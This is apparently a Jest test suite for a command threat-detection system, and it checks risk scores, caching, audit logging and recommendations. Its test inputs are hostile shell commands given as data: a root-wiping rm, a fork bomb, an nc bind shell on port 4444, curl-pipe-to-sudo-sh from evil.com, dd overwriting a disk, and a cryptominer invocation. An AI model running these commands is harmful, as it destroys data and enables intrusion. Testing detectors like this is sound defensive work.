import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { ThreatIntelligenceSystem } from '../../src/security/threat-intelligence';
import { SecureAuditLogger } from '../../src/audit/audit-logger';

// Mock dependencies
jest.mock('../../src/audit/audit-logger');

describe('ThreatIntelligenceSystem', () => {
  let threatIntel: ThreatIntelligenceSystem;
  let mockAuditLogger: jest.Mocked<SecureAuditLogger>;
  let tempDir: string;

  beforeEach(() => {
    jest.clearAllMocks();
    
    // Create temp directory
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'deliberate-threat-test-'));
    process.env.HOME = tempDir;
    
    // Reset singleton
    (ThreatIntelligenceSystem as any).instance = undefined;
    
    // Setup mocks
    mockAuditLogger = {
      log: jest.fn().mockResolvedValue(undefined)
    } as any;
    (SecureAuditLogger.getInstance as jest.Mock).mockReturnValue(mockAuditLogger);
    
    // Stop update cycle in tests
    jest.useFakeTimers();
    
    threatIntel = ThreatIntelligenceSystem.getInstance();
  });

  afterEach(() => {
    threatIntel.stop();
    fs.rmSync(tempDir, { recursive: true, force: true });
    jest.useRealTimers();
  });

  describe('Threat Detection', () => {
    it('should detect known malicious commands', async () => {
      const report = await threatIntel.analyzeCommand('rm', ['-rf', '--no-preserve-root', '/']);
      
      expect(report.matches.length).toBeGreaterThan(0);
      expect(report.riskScore).toBeGreaterThan(0.7);
      expect(report.recommendations).toContain('🚨 BLOCK: High-risk command detected');
    });

    it('should detect fork bombs', async () => {
      const report = await threatIntel.analyzeCommand('bash', ['-c', ':(){ :|:& };:']);
      
      expect(report.matches.length).toBeGreaterThan(0);
      expect(report.riskScore).toBeGreaterThan(0.5);
    });

    it('should detect cryptominer patterns', async () => {
      const report = await threatIntel.analyzeCommand('xmrig', ['--url=pool.example.com']);
      
      expect(report.matches.length).toBeGreaterThan(0);
      const match = report.matches[0];
      expect(match.indicator.tags).toContain('cryptominer');
    });

    it('should detect data exfiltration attempts', async () => {
      const report = await threatIntel.analyzeCommand('curl', ['sensitive-data.txt', '|', 'base64']);
      
      expect(report.matches.length).toBeGreaterThan(0);
      const match = report.matches[0];
      expect(match.indicator.tags).toContain('exfiltration');
    });

    it('should detect backdoor patterns', async () => {
      const report = await threatIntel.analyzeCommand('nc', ['-l', '-p', '4444', '-e', '/bin/bash']);
      
      expect(report.matches.length).toBeGreaterThan(0);
      expect(report.riskScore).toBeGreaterThan(0.6);
    });
  });

  describe('Risk Scoring', () => {
    it('should calculate appropriate risk scores', async () => {
      const lowRisk = await threatIntel.analyzeCommand('ls', ['-la']);
      const mediumRisk = await threatIntel.analyzeCommand('chmod', ['777', 'file.txt']);
      const highRisk = await threatIntel.analyzeCommand('dd', ['if=/dev/random', 'of=/dev/sda']);
      
      expect(lowRisk.riskScore).toBeLessThan(0.3);
      expect(mediumRisk.riskScore).toBeGreaterThan(0.3);
      expect(mediumRisk.riskScore).toBeLessThan(0.7);
      expect(highRisk.riskScore).toBeGreaterThan(0.7);
    });

    it('should consider multiple indicators', async () => {
      const report = await threatIntel.analyzeCommand('curl', ['evil.com/script.sh', '|', 'sudo', 'sh']);
      
      expect(report.matches.length).toBeGreaterThan(1);
      expect(report.riskScore).toBeGreaterThan(0.8);
    });
  });

  describe('Custom Indicators', () => {
    it('should add custom threat indicators', async () => {
      const indicatorId = await threatIntel.addCustomIndicator({
        type: 'command',
        severity: 'critical',
        indicator: 'custom-malware',
        description: 'Custom malware command',
        mitigations: ['Block immediately'],
        tags: ['custom', 'malware']
      });
      
      expect(indicatorId).toBeDefined();
      
      const report = await threatIntel.analyzeCommand('custom-malware', ['--infect']);
      expect(report.matches.length).toBe(1);
      expect(report.matches[0].indicator.id).toBe(indicatorId);
    });

    it('should support pattern-based indicators', async () => {
      await threatIntel.addCustomIndicator({
        type: 'pattern',
        severity: 'high',
        indicator: 'evil.*\\.sh',
        description: 'Evil script pattern',
        tags: ['script', 'malicious']
      });
      
      const report = await threatIntel.analyzeCommand('wget', ['evil-script.sh']);
      expect(report.matches.length).toBeGreaterThan(0);
    });
  });

  describe('False Positive Handling', () => {
    it('should track false positives', async () => {
      const report = await threatIntel.analyzeCommand('rm', ['old-file.txt']);
      
      if (report.matches.length > 0) {
        const indicatorId = report.matches[0].indicator.id;
        await threatIntel.reportFalsePositive(indicatorId, {
          command: 'rm old-file.txt',
          reason: 'Legitimate file deletion'
        });
        
        const stats = threatIntel.getStatistics();
        // Verify false positive was recorded
        expect(stats.totalIndicators).toBeGreaterThan(0);
      }
    });
  });

  describe('Caching', () => {
    it('should cache analysis results', async () => {
      const command = 'test-command';
      const args = ['arg1', 'arg2'];
      
      // First call
      const report1 = await threatIntel.analyzeCommand(command, args);
      
      // Second call (should be cached)
      const report2 = await threatIntel.analyzeCommand(command, args);
      
      expect(report1.timestamp).toBe(report2.timestamp);
    });

    it('should expire cache after timeout', async () => {
      const command = 'test-command';
      const args = ['arg1'];
      
      const report1 = await threatIntel.analyzeCommand(command, args);
      
      // Advance time by 6 minutes
      jest.advanceTimersByTime(6 * 60 * 1000);
      
      const report2 = await threatIntel.analyzeCommand(command, args);
      
      expect(report1.timestamp).not.toBe(report2.timestamp);
    });
  });

  describe('Audit Logging', () => {
    it('should log high-risk detections', async () => {
      await threatIntel.analyzeCommand('rm', ['-rf', '/']);
      
      expect(mockAuditLogger.log).toHaveBeenCalledWith(
        expect.objectContaining({
          event_type: 'security_violation',
          risk_level: 'CRITICAL',
          verdict: 'THREAT_DETECTED'
        })
      );
    });

    it('should not log low-risk commands', async () => {
      await threatIntel.analyzeCommand('ls', ['-la']);
      
      expect(mockAuditLogger.log).not.toHaveBeenCalled();
    });
  });

  describe('Statistics', () => {
    it('should provide comprehensive statistics', async () => {
      // Generate some activity
      await threatIntel.analyzeCommand('rm', ['-rf', '/']);
      await threatIntel.analyzeCommand('ls', ['-la']);
      await threatIntel.addCustomIndicator({
        indicator: 'test-indicator',
        type: 'command',
        severity: 'low'
      });
      
      const stats = threatIntel.getStatistics();
      
      expect(stats.totalIndicators).toBeGreaterThan(0);
      expect(stats.indicatorsByType).toBeDefined();
      expect(stats.indicatorsBySeverity).toBeDefined();
      expect(stats.cacheSize).toBeGreaterThan(0);
      expect(stats.topThreats).toBeDefined();
    });
  });

  describe('Recommendations', () => {
    it('should provide actionable recommendations', async () => {
      const criticalReport = await threatIntel.analyzeCommand('rm', ['-rf', '--no-preserve-root', '/']);
      expect(criticalReport.recommendations).toContain('🚨 BLOCK: High-risk command detected');
      expect(criticalReport.recommendations).toContain('Notify security team immediately');
      
      const highReport = await threatIntel.analyzeCommand('curl', ['suspicious.com', '|', 'sh']);
      expect(highReport.recommendations.some(r => r.includes('WARNING'))).toBe(true);
      
      const mediumReport = await threatIntel.analyzeCommand('chmod', ['777', 'script.sh']);
      expect(mediumReport.recommendations.some(r => r.includes('CAUTION'))).toBe(true);
    });
  });
});